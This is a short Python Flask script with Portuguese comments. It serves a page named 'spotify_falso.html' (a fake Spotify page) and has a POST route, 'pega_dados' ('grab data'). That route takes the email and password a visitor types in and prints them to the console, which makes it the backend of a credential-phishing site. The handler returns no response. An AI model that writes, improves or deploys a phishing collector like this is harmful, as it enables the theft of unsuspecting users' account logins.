from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/") #pagina inicial
def pagina_inicial():
    return render_template("spotify_falso.html")

@app.route("/pega_dados", methods = ["POST"])

def pega_dados():
    email = request.form.get("file")
    senha = request.form.get("password")

    print (f"email: {email} \n senha: {senha}")


app.run()